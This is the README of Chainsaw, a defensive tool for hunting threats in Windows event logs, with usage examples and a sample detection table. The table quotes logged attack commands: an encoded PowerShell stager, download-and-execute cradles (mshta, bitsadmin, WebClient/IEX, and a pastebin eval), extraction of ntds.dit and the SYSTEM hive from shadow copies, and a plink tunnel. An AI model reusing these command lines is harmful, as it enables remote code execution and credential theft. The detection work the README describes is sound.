<div align="center">
 <p>
  <h1>
   Rapidly Search and Hunt through Windows Event Logs
  </h1>
 </p>
<img style="padding:0;vertical-align:bottom;" height="76" width="300" src="chainsaw.png"/>
</div>

---
Chainsaw provides a powerful ‘first-response’ capability to quickly identify threats within Windows event logs. It offers a generic and fast method of searching through event logs for keywords, and by identifying threats using built-in detection logic and via support for Sigma detection rules.

## Features
---

 - :mag: Search and extract event log records by event IDs, string matching, and regex patterns
 - :dart: Hunt for threats using [Sigma](https://github.com/SigmaHQ/sigma) detection rules and custom built-in detection logic
 - :zap: Lightning fast, written in rust, wrapping the [EVTX parser](https://github.com/omerbenamram/evtx) library by [@OBenamram](https://twitter.com/obenamram?lang=en)
 - :fire:  Document tagging (detection logic matching) provided by the [TAU Engine](https://github.com/countercept/tau-engine) Library
 - :bookmark_tabs: Output in an ASCII table format, CSV format, or JSON format

## Hunting Logic
---

### Sigma Rule Matching
Using the `--rules` and `--mapping` parameters you can specify a directory containing a subset of SIGMA detection rules (or just the entire SIGMA git repo) and chainsaw will automatically load, convert and run these rules against the provided event logs. The mapping file tells chainsaw what event IDs to run the detection rules against, and what fields are relevant. By default the following event IDs are supported:

|Event Type|Event ID  |
|--|--|
|Process Creation (Sysmon)| 1 |
|Network Connections (Sysmon)|3|
|Image Loads (Sysmon)|7|
|File Creation (Sysmon)|11|
|Registry Events (Sysmon)|13|
|Powershell Script Blocks|4104|
|Process Creation|4688|
|Scheduled Task Creation|4698|
|Service Creation|7045|

### Built-In Logic

 1. Extraction and parsing of Windows Defender, F-Secure, Sophos, and Kaspersky AV alerts
 2. Detection of key event logs being cleared, or the event log service being stopped
 3. Users being created or added to sensitive user groups
 4. Brute-force of local user accounts
 5. RDP Logins

You can specify the `--lateral-all` flag to chainsaw to also parse and extract additional 4624 logon types (network logons, service, batch etc.) relating to potential lateral movement that may be interesting for investigations.

## Getting Started
---
You can find pre-compiled versions of chainsaw in the releases section of this Github repo, or you can clone the repo (and the submodules) by running:
 `git clone --recurse-submodules https://github.com/countercept/chainsaw.git`

You can then compile the code yourself by running:  `cargo build --release`. Once the build has finished, you will find a copy of the compiled binary in the target/release folder.

**Make sure to build with the `--release` flag as this will ensure significantly faster execution time.**

If you want to quickly see what Chainsaw looks like when it runs, you can use the command:
```
./chainsaw hunt evtx_attack_samples/ --rules sigma_rules/ --mapping mapping_files/sigma-mapping.yml
```



## Examples
---
### Searching

#### Command Examples

   *Search all .evtx files in the evtx_files dir for event id 4624*

    ./chainsaw search ~/Downloads/evtx_files/ -e 4624

   *Search a specific evtx log for logon events containing the string "bob" (case insensitive)*

    ./chainsaw search ~/Downloads/evtx_files/security.evtx -e 4624 -s "bob" -i

   *Search a specific evtx log for logon events, with a matching regex pattern, output in JSON format*

     ./chainsaw search ~/Downloads/evtx_files/security.evtx -e 4624 -r "bob[a-zA-Z]" --json


### Hunting

#### Command Examples
*Hunt through all event logs in a specific path, show additional information relating to potential lateral movement, and save results to individual CSV files*

	-> % ./chainsaw hunt evtx_attack_samples --lateral-all --csv chainsaw_output

	 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
	██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
	██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
	██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
	╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
	 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
	    By F-Secure Countercept (@FranticTyping, @AlexKornitzer)

	[+] Found 268 EVTX files
	[!] Continuing without detection rules, no path provided
	[+] Hunting: [========================================] 268/268

	[+] Created security_audit_log_was_cleared.csv
	[+] Created windows_defender_detections.csv
	[+] Created system_log_was_cleared.csv
	[+] Created new_user_created.csv
	[+] Created user_added_to_interesting_group.csv
	[+] Created 4624_logins.csv

	[+] 51 Detections found

*Hunt through all event logs in a specific path, apply detection logic and TAU rules from the specified path*

	-> % ./chainsaw hunt evtx_attack_samples/ --rules sigma_rules/ --mapping mapping_files/sigma-mapping.yml

     ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
    ██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
    ██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
    ██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
    ╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
        By F-Secure Countercept (Author: @FranticTyping)

    [+] Found 266 EVTX files
    [+] Loaded 734 detection rules (74 were not loadeD)
    [+] Printing results to screen
    [+] Hunting: [========================================] 100%

    [+] Detection: Security audit log was cleared
    ┌─────────────────────┬──────┬───────────────────────────────────┬─────────────────┐
    │     system_time     │  id  │             computer              │  subject_user   │
    ├─────────────────────┼──────┼───────────────────────────────────┼─────────────────┤
    │ 2019-01-20 07:00:50 │ 1102 │ "WIN-77LTAPHIQ1R.example.corp"    │ "Administrator" │
    ├─────────────────────┼──────┼───────────────────────────────────┼─────────────────┤
    │ 2019-01-20 07:29:57 │ 1102 │ "WIN-77LTAPHIQ1R.example.corp"    │ "Administrator" │
    ├─────────────────────┼──────┼───────────────────────────────────┼─────────────────┤
    │ 2019-11-15 08:19:02 │ 1102 │ "alice.insecurebank.local"        │ "bob"           │
    ├─────────────────────┼──────┼───────────────────────────────────┼─────────────────┤
    │ 2020-07-22 20:29:27 │ 1102 │ "01566s-win16-ir.threebeesco.com" │ "a-jbrown"      │
    ├─────────────────────┼──────┼───────────────────────────────────┼─────────────────┤
    │ 2020-09-02 11:47:39 │ 1102 │ "01566s-win16-ir.threebeesco.com" │ "a-jbrown"      │
    ├─────────────────────┼──────┼───────────────────────────────────┼─────────────────┤
    │ 2020-09-15 18:04:36 │ 1102 │ "MSEDGEWIN10"                     │ "IEUser"        │
    ├─────────────────────┼──────┼───────────────────────────────────┼─────────────────┤
    │ 2020-09-15 19:28:17 │ 1102 │ "01566s-win16-ir.threebeesco.com" │ "a-jbrown"      │
    ├─────────────────────┼──────┼───────────────────────────────────┼─────────────────┤
    │ 2020-09-17 10:57:37 │ 1102 │ "01566s-win16-ir.threebeesco.com" │ "a-jbrown"      │
    ├─────────────────────┼──────┼───────────────────────────────────┼─────────────────┤
    │ 2020-09-23 16:49:41 │ 1102 │ "01566s-win16-ir.threebeesco.com" │ "Administrator" │
    └─────────────────────┴──────┴───────────────────────────────────┴─────────────────┘

    [+] Detection: Suspicious Command Line
    ┌─────────────────────┬──────┬──────────────────────────────┬─────────────────────┬─────────────────────────────┬───────────────────────────────────┐
    │     system_time     │  id  │       detection_rules        │    computer_name    │ Event.EventData.CommandLine │           process_name            │
    ├─────────────────────┼──────┼──────────────────────────────┼─────────────────────┼─────────────────────────────┼───────────────────────────────────┤
    │ 2019-02-13 18:03:28 │ 4688 │ ‣ Exfiltration and Tunneling │ "PC01.example.corp" │ <empty>                     │ C:\Users\user01\Desktop\plink.exe │
    │                     │      │ Tools Execution              │                     │                             │                                   │
    └─────────────────────┴──────┴──────────────────────────────┴─────────────────────┴─────────────────────────────┴───────────────────────────────────┘

    [+] Detection: Suspicious Process Creation
    ┌─────────────────────┬────┬──────────────────────────────────────────┬────────────────────────────────┬────────────────────────────────────────────────────┬────────────────────────────────────────────────────┐
    │     system_time     │ id │             detection_rules              │         computer_name          │               Event.EventData.Image                │                    command_line                    │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-02-16 10:02:21 │ 1  │ ‣ Exfiltration and Tunneling             │ "PC01.example.corp"            │ C:\Users\IEUser\Desktop\plink.exe                  │ plink.exe 10.0.2.18 -P 80 -C -R 127.0.0.3:4444:127 │
    │                     │    │ Tools Execution                          │                                │                                                    │ .0.0.2:3389 -l test -pw test                       │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-03-17 20:18:09 │ 1  │ ‣ Netsh Port or Application              │ "PC04.example.corp"            │ C:\Windows\System32\netsh.exe                      │ netsh advfirewall firewall add rule name="Remote D │
    │                     │    │ Allowed                                  │                                │                                                    │ esktop" dir=in protocol=tcp localport=3389 profile │
    │                     │    │ ‣ Netsh RDP Port Opening                 │                                │                                                    │ =any action=allow                                  │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-03-17 20:20:17 │ 1  │ ‣ File or Folder Permissions             │ "PC04.example.corp"            │ C:\Windows\System32\icacls.exe                     │ "C:\Windows\System32\icacls.exe" C:\Windows\System │
    │                     │    │ Modifications                            │                                │                                                    │ 32\termsrv.dll /grant %%username%%:F               │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-03-17 20:20:17 │ 1  │ ‣ File or Folder Permissions             │ "PC04.example.corp"            │ C:\Windows\System32\icacls.exe                     │ "C:\Windows\System32\icacls.exe" C:\Windows\System │
    │                     │    │ Modifications                            │                                │                                                    │ 32\termsrv.dll /grant *S-1-1-0:(F)                 │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-04-27 18:47:00 │ 1  │ ‣ Execution from Suspicious              │ "IEWIN7"                       │ C:\Users\Public\KeeFarce.exe                       │ KeeFarce.exe                                       │
    │                     │    │ Folder                                   │                                │                                                    │                                                    │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-04-29 20:59:21 │ 1  │ ‣ Non Interactive PowerShell             │ "IEWIN7"                       │ C:\Windows\System32\WindowsPowerShell\v1.0\powersh │ "C:\Windows\System32\WindowsPowerShell\v1.0\powers │
    │                     │    │                                          │                                │ ell.exe                                            │ hell.exe" -s -NoLogo -NoProfile                    │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-04-29 20:59:22 │ 1  │ ‣ Local Accounts Discovery               │ "IEWIN7"                       │ C:\Windows\System32\whoami.exe                     │ "C:\Windows\system32\whoami.exe" /all              │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-04-30 07:46:15 │ 1  │ ‣ Meterpreter or Cobalt                  │ "IEWIN7"                       │ C:\Windows\System32\cmd.exe                        │ cmd.exe /c echo msdhch > \\.\pipe\msdhch           │
    │                     │    │ Strike Getsystem Service                 │                                │                                                    │                                                    │
    │                     │    │ Start                                    │                                │                                                    │                                                    │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-04-30 20:26:52 │ 1  │ ‣ Mimikatz Command Line                  │ "IEWIN7"                       │ C:\Windows\System32\cmd.exe                        │ C:\Windows\system32\cmd.exe /b /c start /b /min po │
    │                     │    │ ‣ FromBase64String Command               │                                │                                                    │ wershell.exe -nop -w hidden -noni -c "if([IntPtr]: │
    │                     │    │ Line                                     │                                │                                                    │ :Size -eq 4){$b='powershell.exe'}else{$b=$env:wind │
    │                     │    │ ‣ Curl Start Combination                 │                                │                                                    │ ir+'\syswow64\WindowsPowerShell\v1.0\powershell.ex │
    │                     │    │                                          │                                │                                                    │ e'};$s=New-Object System.Diagnostics.ProcessStartI │
    │                     │    │                                          │                                │                                                    │ nfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hid │
    │                     │    │                                          │                                │                                                    │ den -c &([scriptblock]::create((New-Object IO.Stre │
    │                     │    │                                          │                                │                                                    │ amReader(New-Object IO.Compression.GzipStream((New │
    │                     │    │                                          │                                │                                                    │ -Object IO.MemoryStream(,[Convert]::FromBase64Stri │
    │                     │    │                                          │                                │                                                    │ ng(''H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVu │
    │                     │    │                                          │                                │                                                    │ jVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7M │
    │                     │    │                                          │                                │                                                    │ z33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5 │
    │                     │    │                                          │                                │                                                    │ Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OS │
    │                     │    │                                          │                                │                                                    │ TiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaM │
    │                     │    │                                          │                                │                                                    │ irk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEn │
    │                     │    │                                          │                                │                                                    │ tiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/ │
    │                     │    │                                          │                                │                                                    │ Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrR │
    │                     │    │                                          │                                │                                                    │ ItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/meb │
    │                     │    │                                          │                                │                                                    │ DLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/ │
    │                     │    │                                          │                                │                                                    │ O35y7GUVWdyP6kiEwOpsexgQCk7s8pg...                 │
    │                     │    │                                          │                                │                                                    │                                                    │
    │                     │    │                                          │                                │                                                    │ (use --full to show all content)                   │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-04-30 20:26:52 │ 1  │ ‣ Mimikatz Command Line                  │ "IEWIN7"                       │ C:\Windows\System32\WindowsPowerShell\v1.0\powersh │ powershell.exe -nop -w hidden -noni -c "if([IntPtr │
    │                     │    │ ‣ FromBase64String Command               │                                │ ell.exe                                            │ ]::Size -eq 4){$b='powershell.exe'}else{$b=$env:wi │
    │                     │    │ Line                                     │                                │                                                    │ ndir+'\syswow64\WindowsPowerShell\v1.0\powershell. │
    │                     │    │ ‣ Non Interactive PowerShell             │                                │                                                    │ exe'};$s=New-Object System.Diagnostics.ProcessStar │
    │                     │    │                                          │                                │                                                    │ tInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w h │
    │                     │    │                                          │                                │                                                    │ idden -c &([scriptblock]::create((New-Object IO.St │
    │                     │    │                                          │                                │                                                    │ reamReader(New-Object IO.Compression.GzipStream((N │
    │                     │    │                                          │                                │                                                    │ ew-Object IO.MemoryStream(,[Convert]::FromBase64St │
    │                     │    │                                          │                                │                                                    │ ring(''H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJ │
    │                     │    │                                          │                                │                                                    │ VujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM │
    │                     │    │                                          │                                │                                                    │ 7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQh │
    │                     │    │                                          │                                │                                                    │ z5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9 │
    │                     │    │                                          │                                │                                                    │ OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdF │
    │                     │    │                                          │                                │                                                    │ aMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkv │
    │                     │    │                                          │                                │                                                    │ EntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJv │
    │                     │    │                                          │                                │                                                    │ U/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEiv │
    │                     │    │                                          │                                │                                                    │ rRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/m │
    │                     │    │                                          │                                │                                                    │ ebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz │
    │                     │    │                                          │                                │                                                    │ 2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE │
    │                     │    │                                          │                                │                                                    │ 0148Sosy+wCrl3Gbhx9ZapgqKfP+0Bd...                 │
    │                     │    │                                          │                                │                                                    │                                                    │
    │                     │    │                                          │                                │                                                    │ (use --full to show all content)                   │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-19 15:11:26 │ 1  │ ‣ Shadow Copies Creation                 │ "MSEDGEWIN10"                  │ C:\Windows\System32\vssadmin.exe                   │ vssadmin.exe create shadow /for=C:                 │
    │                     │    │ Using Operating Systems                  │                                │                                                    │                                                    │
    │                     │    │ Utilities                                │                                │                                                    │                                                    │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-19 15:11:27 │ 1  │ ‣ Copying Sensitive Files                │ "MSEDGEWIN10"                  │ C:\Windows\System32\cmd.exe                        │ "C:\Windows\system32\cmd.exe" /c "copy \\?\GLOBALR │
    │                     │    │ with Credential Data                     │                                │                                                    │ OOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ │
    │                     │    │                                          │                                │                                                    │ NTDS.dit C:\Extract\ntds.dit"                      │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-19 15:11:27 │ 1  │ ‣ Copying Sensitive Files                │ "MSEDGEWIN10"                  │ C:\Windows\System32\cmd.exe                        │ "C:\Windows\system32\cmd.exe" /c "copy \\?\GLOBALR │
    │                     │    │ with Credential Data                     │                                │                                                    │ OOT\Device\HarddiskVolumeShadowCopy1\Windows\Syste │
    │                     │    │                                          │                                │                                                    │ m32\config\SYSTEM C:\Extract\VSC_SYSTEM_HIVE"      │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-26 07:39:14 │ 1  │ ‣ HH.exe Execution                       │ "MSEDGEWIN10"                  │ C:\Windows\hh.exe                                  │ "C:\Windows\hh.exe" C:\Users\IEUser\Desktop\Fax Re │
    │                     │    │                                          │                                │                                                    │ cord N104F.chm                                     │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-26 07:39:14 │ 1  │ ‣ HTML Help Shell Spawn                  │ "MSEDGEWIN10"                  │ C:\Windows\System32\cmd.exe                        │ "C:\Windows\System32\cmd.exe" /c copy /Y C:\Window │
    │                     │    │ ‣ Suspicious Rundll32 Activity           │                                │                                                    │ s\system32\rundll32.exe %%TEMP%%\out.exe > nul &&  │
    │                     │    │                                          │                                │                                                    │ %%TEMP%%\out.exe javascript:"\..\mshtml RunHTMLApp │
    │                     │    │                                          │                                │                                                    │ lication ";document.write();h=new%%20ActiveXObject │
    │                     │    │                                          │                                │                                                    │ ("WinHttp.WinHttpRequest.5.1");h.Open("GET","http: │
    │                     │    │                                          │                                │                                                    │ //pastebin.com/raw/y2CjnRtH",false);try{h.Send();b │
    │                     │    │                                          │                                │                                                    │ =h.ResponseText;eval(b);}catch(e){new%%20ActiveXOb │
    │                     │    │                                          │                                │                                                    │ ject("WScript.Shell").Run("cmd /c taskkill /f /im  │
    │                     │    │                                          │                                │                                                    │ out.exe",0,true);}                                 │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-29 21:11:17 │ 1  │ ‣ Suspicious Rundll32 Activity           │ "MSEDGEWIN10"                  │ C:\Windows\System32\rundll32.exe                   │ "C:\Windows\system32\rundll32.exe" Shell32.dll,Con │
    │                     │    │                                          │                                │                                                    │ trol_RunDLL "C:\Users\IEUser\Downloads\Invoice@058 │
    │                     │    │                                          │                                │                                                    │ 2.cpl",                                            │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-29 21:11:17 │ 1  │ ‣ Suspicious Call by Ordinal             │ "MSEDGEWIN10"                  │ C:\Windows\SysWOW64\rundll32.exe                   │ "C:\Windows\SysWOW64\rundll32.exe" "C:\Windows\Sys │
    │                     │    │                                          │                                │                                                    │ WOW64\shell32.dll",#44 "C:\Users\IEUser\Downloads\ │
    │                     │    │                                          │                                │                                                    │ Invoice@0582.cpl",                                 │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-29 21:32:58 │ 1  │ ‣ Suspicious Certutil Command            │ "MSEDGEWIN10"                  │ C:\Windows\System32\cmd.exe                        │ cmd /c certutil -f -decode fi.b64 AllTheThings.dll │
    │                     │    │                                          │                                │                                                    │                                                    │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-29 21:32:59 │ 1  │ ‣ Suspicious Certutil Command            │ "MSEDGEWIN10"                  │ C:\Windows\System32\certutil.exe                   │ certutil -f -decode fi.b64 AllTheThings.dll        │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-29 21:33:03 │ 1  │ ‣ Bitsadmin Download                     │ "MSEDGEWIN10"                  │ C:\Windows\System32\bitsadmin.exe                  │ bitsadmin.exe /transfer "JobName" https://raw.gith │
    │                     │    │                                          │                                │                                                    │ ubusercontent.com/op7ic/EDR-Testing-Script/master/ │
    │                     │    │                                          │                                │                                                    │ Payloads/CradleTest.txt "C:\Windows\system32\Defau │
    │                     │    │                                          │                                │                                                    │ lt_File_Path.ps1"                                  │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-29 21:33:18 │ 1  │ ‣ Mshta JavaScript Execution             │ "MSEDGEWIN10"                  │ C:\Windows\System32\mshta.exe                      │ mshta.exe javascript:a=GetObject("script:https://r │
    │                     │    │ ‣ Suspicious Rundll32 Activity           │                                │                                                    │ aw.githubusercontent.com/op7ic/EDR-Testing-Script/ │
    │                     │    │                                          │                                │                                                    │ master/Payloads/Mshta_calc.sct").Exec();close();   │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-29 21:33:23 │ 1  │ ‣ Encoded PowerShell Command             │ "MSEDGEWIN10"                  │ C:\Windows\System32\WindowsPowerShell\v1.0\powersh │ powershell -c "(New-Object Net.WebClient).Download │
    │                     │    │ Line                                     │                                │ ell.exe                                            │ File('https://raw.githubusercontent.com/op7ic/EDR- │
    │                     │    │ ‣ Non Interactive PowerShell             │                                │                                                    │ Testing-Script/master/Payloads/CradleTest.txt','De │
    │                     │    │                                          │                                │                                                    │ fault_File_Path.ps1');IEX((-Join([IO.File]::ReadAl │
    │                     │    │                                          │                                │                                                    │ lBytes('Default_File_Path.ps1')|ForEach-Object{[Ch │
    │                     │    │                                          │                                │                                                    │ ar]$_})))"                                         │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-29 21:33:28 │ 1  │ ‣ Possible Applocker Bypass              │ "MSEDGEWIN10"                  │ C:\Windows\System32\cmd.exe                        │ cmd /c C:\Windows\Microsoft.NET\Framework\v4.0.303 │
    │                     │    │                                          │                                │                                                    │ 19\regsvcs.exe AllTheThings.dll                    │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-29 21:33:28 │ 1  │ ‣ Possible Applocker Bypass              │ "MSEDGEWIN10"                  │ C:\Windows\System32\cmd.exe                        │ cmd /c C:\Windows\Microsoft.NET\Framework\v2.0.507 │
    │                     │    │                                          │                                │                                                    │ 27\regsvcs.exe AllTheThings.dll                    │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-29 21:33:29 │ 1  │ ‣ Possible Applocker Bypass              │ "MSEDGEWIN10"                  │ C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegS │ C:\Windows\Microsoft.NET\Framework\v4.0.30319\regs │
    │                     │    │                                          │                                │ vcs.exe                                            │ vcs.exe AllTheThings.dll                           │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-29 21:33:29 │ 1  │ ‣ Possible Applocker Bypass              │ "MSEDGEWIN10"                  │ C:\Windows\System32\cmd.exe                        │ cmd /c C:\Windows\Microsoft.NET\Framework64\v2.0.5 │
    │                     │    │                                          │                                │                                                    │ 0727\regsvcs.exe AllTheThings.dll                  │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-29 21:33:29 │ 1  │ ‣ Possible Applocker Bypass              │ "MSEDGEWIN10"                  │ C:\Windows\System32\cmd.exe                        │ cmd /c C:\Windows\Microsoft.NET\Framework64\v4.0.3 │
    │                     │    │                                          │                                │                                                    │ 0319\regsvcs.exe AllTheThings.dll                  │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2019-07-29 21:33:34 │ 1  │ ‣ Possible Applocker Bypass              │ "MSEDGEWIN10"                  │ C:\Windows\System32\cmd.exe                        │ cmd /c C:\Windows\Microsoft.NET\Framework\v2.0.507 │
    │                     │    │                                          │                                │                                                    │ 27\regasm.exe /U AllTheThings.dll                  │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-12-04 22:41:04 │ 1  │ ‣ Suspicious Svchost Process             │ "MSEDGEWIN10"                  │ C:\Windows\System32\svchost.exe                    │ C:\Windows\system32\svchost.exe -k localService -p │
    │                     │    │ ‣ Windows Processes Suspicious           │                                │                                                    │  -s RemoteRegistry                                 │
    │                     │    │ Parent Directory                         │                                │                                                    │                                                    │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-12-09 16:52:34 │ 1  │ ‣ Execution from Suspicious              │ "MSEDGEWIN10"                  │ C:\Users\Public\psexecprivesc.exe                  │ "C:\Users\Public\psexecprivesc.exe" C:\Windows\Sys │
    │                     │    │ Folder                                   │                                │                                                    │ tem32\mspaint.exe                                  │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2020-12-09 16:52:41 │ 1  │ ‣ PsExec Service Start                   │ "MSEDGEWIN10"                  │ C:\Windows\PSEXESVC.exe                            │ C:\Windows\PSEXESVC.exe                            │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2021-01-26 13:21:13 │ 1  │ ‣ Possible Applocker Bypass              │ "LAPTOP-JU4M3I0E"              │ C:\Program Files (x86)\Microsoft Visual Studio\201 │ C:\Program Files (x86)\Microsoft Visual Studio\201 │
    │                     │    │                                          │                                │ 9\Community\MSBuild\Current\Bin\MSBuild.exe        │ 9\Community\MSBuild\Current\Bin\MSBuild.exe /nolog │
    │                     │    │                                          │                                │                                                    │ o /nodemode:1 /nodeReuse:true /low:false           │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2021-01-26 13:21:14 │ 1  │ ‣ Non Interactive PowerShell             │ "LAPTOP-JU4M3I0E"              │ C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powersh │ powershell.exe  start-process notepad.exe          │
    │                     │    │                                          │                                │ ell.exe                                            │                                                    │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
    │ 2021-04-20 20:32:55 │ 1  │ ‣ Non Interactive PowerShell             │ "MSEDGEWIN10"                  │ C:\Windows\System32\WindowsPowerShell\v1.0\powersh │ "C:\Windows\System32\WindowsPowerShell\v1.0\powers │
    │                     │    │                                          │                                │ ell.exe                                            │ hell.exe" -Version 5.1 -s -NoLogo -NoProfile       │
    ├─────────────────────┼────┼──────────────────────────────────────────┼────────────────────────────────┼────────────────────────────────────────────────────┼────────────────────────────────────────────────────┤
